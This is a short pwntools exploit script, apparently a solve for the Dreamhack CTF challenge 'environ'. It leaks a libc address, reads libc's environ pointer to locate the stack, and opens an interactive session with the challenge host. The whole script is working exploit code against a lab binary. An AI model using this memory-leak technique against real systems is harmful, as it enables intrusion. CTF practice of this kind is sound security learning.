from pwn import *

if args.LOCAL:
    io=process('./environ_patched')
    if args.GDB:
        cmd="""
        init-pwndbg
        """
        gdb.attach(io, cmd)
else:
    io=remote('host3.dreamhack.games', 10535)
    
elf=context.binary=ELF('./environ_patched')
libc=ELF('./libc.so.6')
io.recvuntil(b'stdout: ')
libc.address=int(io.recv(14), 16) - 0x21a780

print(hex(libc.address))

io.sendline(b'1')

io.sendline(str(libc.sym.environ).encode())
io.recvuntil(b' Addr: ')
stack=u64(io.recv(6)+b'\0\0') - 0x1568

print(hex(stack))
io.sendline(b'1')
io.sendline(str(stack).encode())
io.interactive()